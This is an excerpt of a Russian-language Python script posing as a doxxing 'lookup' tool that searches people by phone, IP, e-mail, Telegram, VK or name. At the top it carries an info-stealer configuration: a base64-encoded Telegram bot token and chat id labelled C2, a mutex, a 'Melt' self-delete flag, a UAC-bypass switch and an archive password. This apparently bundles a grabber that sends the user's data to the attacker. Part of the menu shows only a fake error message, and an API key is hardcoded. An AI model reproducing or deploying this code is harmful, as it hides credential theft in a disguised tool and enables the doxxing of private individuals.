...
class Settings:
    C2 = (1, base64.b64decode('NjkxODM2MjU0NDpBQUV5dW5ldEVEYWJveG5pRlpFanFMM2NyR1lIdG9rdVhfSSQ2NDYzMTcyMzA2').decode())
    Mutex = base64.b64decode('Z2FrNXMyb1p6Z2l1eDR5cw==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('c2hhZG93cw==').decode()
...
██║  ██║██║███████╗███████╗██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝                                                                                     
{Fore.WHITE}СОЗДАТЕЛЬ:{Fore.RED} t.me/imperfucking
{Fore.WHITE}ПЕРЕХОДНИК:{Fore.RED} t.me/skillnet'''


def mani2ii34d():
    print(banner)
    choose = input(Fore.YELLOW + '''1. Пробив по номеру
2. Пробив по IP
3. Пробив по Discord
4. Пробив по e-mail
5. Пробив по Telegram
6. Пробив по VK
7. Пробив по ФИО
8. Пробив по Никнейму
9. Узнать историю личности
10. Запрос логов вирт. номера
Введите номер функции: ''')
    if choose == '1':
        ...
        print('ERROR: 0xc00007b, повторите попытку позже!')
        menu()

def get_phone_info(phone_number):
    api_url = f"http://apilayer.net/api/validate?access_key=4ed6cbfa854e514ef8a07ab789173d04&number={phone_number}&country_code=&format=1"
    ...
    try:
        ...
        if data.get("valid"):
            print("Информация найденная в соответствии с вашим запросом:")
            print(f"Номер: {data['number']}")
            print(f"Локальный формат: {data['local_format']}")
            print(f"Интернациональный формат: {data['international_format']}")
            print(f"Префикс страны: {data['country_prefix']}")
            print(f"Код страны: {data['country_code']}")
            print(f"Страна: {data['country_name']}")
            print(f"Гео: {data['location']}")
            print(f"Оператор: {data['carrier']}")
            print(f"Тип линии: {data['line_type']}")
        else:
            print("По всей видимости вы ввели неправильный номер.")
...
def get_ip_info(ip):
    ...
    try:
        ...
        if data.get("success"):
            print("Информация найденная в соответствии с вашим запросом:")
            print(f"IP: {data['ip']}")
            print(f"Валид: {data['success']}")
            print(f"Тип ip-адреса: {data['type']}")
            print(f"Континент: {data['continent']}")
            print(f"Страна: {data['country']}")
            print(f"Регион: {data['region']}")
            print(f"Код региона: {data['region_code']}")
            print(f"Город: {data['city']}")
            print(f"Широта: {data['latitude']}")
            print(f"Долгота: {data['longitude']}")
        else:
            print("По всей видимости вы ввели неправильный ip-адрес.")
    except requests.RequestException as e:
        print(f"Error: {e}")
mani2ii34d()
